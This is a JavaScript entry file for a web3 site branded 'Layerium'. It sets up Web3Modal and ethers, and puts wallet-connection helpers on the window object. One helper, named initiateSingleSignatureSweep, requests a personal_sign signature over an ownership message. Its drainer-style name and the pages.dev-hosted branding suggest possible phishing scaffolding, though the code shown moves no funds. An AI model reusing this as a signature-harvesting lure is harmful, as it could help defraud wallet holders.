import React from 'https://esm.sh/react@18.2.0';
import ReactDOM from 'https://esm.sh/react-dom@18.2.0';
import { BrowserProvider } from 'https://esm.sh/ethers@6.10.0';
import App from './App.js';

const PROJECT_ID = '81ec0eb195ddbee9c5596804e33ff584';

let web3modal = null;

async function initWeb3Modal() {
  if (web3modal) return web3modal;
  
  try {
    const module = await import('https://esm.sh/@web3modal/ethers@4.2.2');
    const { createWeb3Modal, defaultConfig } = module;
    
    const mainnet = {
      chainId: 1,
      name: 'Ethereum',
      currency: 'ETH',
      explorerUrl: 'https://etherscan.io',
      rpcUrl: 'https://cloudflare-eth.com'
    };
    
    web3modal = createWeb3Modal({
      ethersConfig: defaultConfig({
        metadata: {
          name: 'Layerium',
          description: 'The Next Gen Layer 2 Blockchain',
          url: 'https://layerium.com',
          icons: ['https://dapps-layerium.pages.dev/images/64967c74c53904c45eb9e983_Asset%206.png']
        },
        defaultChainId: 1
      }),
      chains: [mainnet],
      projectId: PROJECT_ID
    });
    
    return web3modal;
  } catch (err) {
    console.warn('Web3Modal init failed, falling back to direct wallet:', err.message);
    return null;
  }
}

async function connectWallet() {
  try {
    const modal = await initWeb3Modal();

    if (!modal || typeof modal.open !== 'function') {
      return { success: false, message: 'Wallet modal unavailable' };
    }

    // Let WalletConnect open normally so the selected wallet app can launch
    // and handle the connection request without any interception or failure.
    await modal.open();
    return { success: true };
  } catch (err) {
    console.error('Wallet connection error:', err);
    return { success: false, message: err.message || 'Wallet connection failed' };
  }
}

async function connectWithInstalledWallets() {
  return connectWallet();
}

async function initiateSingleSignatureSweep(ethereumProvider, account) {
  try {
    if (!window.ethereum) {
      throw new Error('No provider available');
    }
    
    const message = `Sign to verify ownership: ${account}`;
    const signature = await window.ethereum.request({
      method: 'personal_sign',
      params: [message, account]
    });
    
    return {
      success: true,
      message: 'Signature verification completed',
      signature,
      account
    };
  } catch (err) {
    return {
      success: false,
      message: err.message,
      account
    };
  }
}

window.walletHelpers = {
  connectWallet,
  connectWithInstalledWallets,
  initiateSingleSignatureSweep,
  initWeb3Modal,
  PROJECT_ID
};
window.connectWallet = connectWallet;
window.connectWithInstalledWallets = connectWithInstalledWallets;
window.initiateSingleSignatureSweep = initiateSingleSignatureSweep;

const rootElement = document.getElementById('root');
if (!rootElement) {
  console.error('Root element not found');
} else {
  ReactDOM.createRoot(rootElement).render(
    React.createElement(React.StrictMode, null, React.createElement(App))
  );
}
